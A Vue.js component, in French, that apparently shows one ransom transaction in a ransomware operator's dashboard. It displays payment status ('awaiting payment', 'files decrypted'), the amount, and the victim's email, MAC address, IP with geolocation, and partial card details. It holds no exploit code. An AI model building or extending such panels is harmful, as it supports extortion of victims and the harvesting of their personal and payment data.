<template>
    <stat-card>
        <FlashMessage
            v-if="error"
            :type="'error'"
            :message="error"
        />
        <div v-else>
            <h3 class="text-center">
                {{
                    transaction.paymentStatus === 'payment_intent' ?
                        'Rançon envoyée le '
                        : 'Transaction du '
                }} {{ $moment(transaction.createdAt).format("LLLL") }}
            </h3>
            <div class="paragraph medium grid grid-start">
                <p>Statut : </p>
                <FlashMessage
                    v-if="transaction.paymentStatus === 'payment_success'"
                    type="info"
                    className="btn-small dashboard"
                    message="Paiement effectué"
                />
                <FlashMessage
                    v-else-if="transaction.paymentStatus === 'files_decrypted'"
                    type="success"
                    className="btn-small dashboard"
                    message="Fichiers décryptés"
                />
                <FlashMessage
                    v-else-if="transaction.paymentStatus === 'payment_intent'"
                    type="error"
                    className="btn-small dashboard"
                    message="En attente de paiement"
                />
            </div>

            <div class="paragraph medium grid grid-between">
                <div>
                    <p class="label">
                        Montant
                    </p>
                    <p>
                        {{transaction.amount}} €
                    </p>
                </div>
                <div>
                    <p class="label">
                        Email de l'utilisateur
                    </p>
                    <p>
                        {{user?.email}}
                    </p>
                </div>
                <div>
                    <p class="label">
                        MacAddress de l'utilisateur
                    </p>
                    <p>
                        {{user?.macAddress}}
                    </p>
                </div>
                <div>
                    <p class="label">
                        Adresse IP de l'appareil
                    </p>
                    <p class="grid grid-start p-0">
                        <img :src="`https://flagsapi.com/${ipCountryCode}/flat/24.png`" />
                        <span>{{user?.ip}}</span>
                    </p>
                </div>
            </div>
            <div v-if="transaction.paymentMethod" class="paragraph medium w-40 pt-1">
                <h4 class="label">
                    Moyen de paiement
                </h4>
                <div class="paragraph medium grid grid-between">
                    <div>
                        <p class="grid grid-start p-0">
                            <PaymentCardIllustration :card="paymentMethod.card.brand" />
                            <span>{{cardBrand}}</span>
                        </p>
                        <p>
                            <span class="label">Expiration</span>&nbsp;&nbsp;&nbsp;{{paymentMethod.card.exp_month}}/{{paymentMethod.card.exp_year}}
                        </p>
                    </div>
                    <div>
                        <p>
                            <span class="label">Numéro</span>&nbsp;&nbsp;&nbsp;****&nbsp;****&nbsp;****&nbsp;{{paymentMethod.card.last4}}
                        </p>
                        <p class="grid grid-start p-0">
                            <span class="label">Origine</span>
                            <img :src="`https://flagsapi.com/${paymentMethod.card.country}/flat/24.png`" />{{cardCountry}}
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </stat-card>
</template>

<script lang="ts">
import StatCard from "../stats/StatCard.vue";
import {defineComponent} from "vue";
import FlashMessage from "../FlashMessage.vue";
import { Transaction } from '../../core/models/transaction';
import { User } from "../../core/models/user";
import PaymentCardIllustration from "../dashboard/PaymentCardIllustration.vue";
import {CountriesEnum} from "../../core/enums/countriesEnum";

export default defineComponent({
    name: "PaymentDetail",
    components: {PaymentCardIllustration, FlashMessage, StatCard},
    props: {
        transaction: {type: Object, default: <Transaction>{}},
        user: {type: Object, default: <User>{}},
        error: String
    },
    data() {
        return {
            ipCountry: '' as String
        }
    },
    computed: {
        paymentMethod() {
            return JSON.parse(this.transaction.paymentMethod)
        },
        cardBrand() {
            const capitalizedFirst = this.paymentMethod.card.brand[0].toUpperCase();
            const rest = this.paymentMethod.card.brand.slice(1);

            return capitalizedFirst + rest;
        },
        cardCountry() {
            const countryName = Object.entries(CountriesEnum).find((value) => value[0] === this.paymentMethod.card.country)
            return (countryName || [])[1];
        },
        ipCountryCode() {
            if(this.user.ip === '127.0.0.1') {
                this.ipCountry = 'FR';
            } else {
                fetch(`https://ipapi.co/${this.user.ip}/json/`, {method: 'GET'}).then(res => res.json())
                    .then((res) => {
                        this.ipCountry = res.country_code
                    })
            }
            return this.ipCountry
        }
    }
})
</script>

<style scoped>
    p {
       white-space: nowrap;
    }
    .label {
        line-height: 1.8;
        font-weight: bold;
        letter-spacing: 0.05rem;
    }
    .grid.p-0 {
        padding: 0
    }
    h4 {
        padding: 1rem 1rem 0;
    }
</style>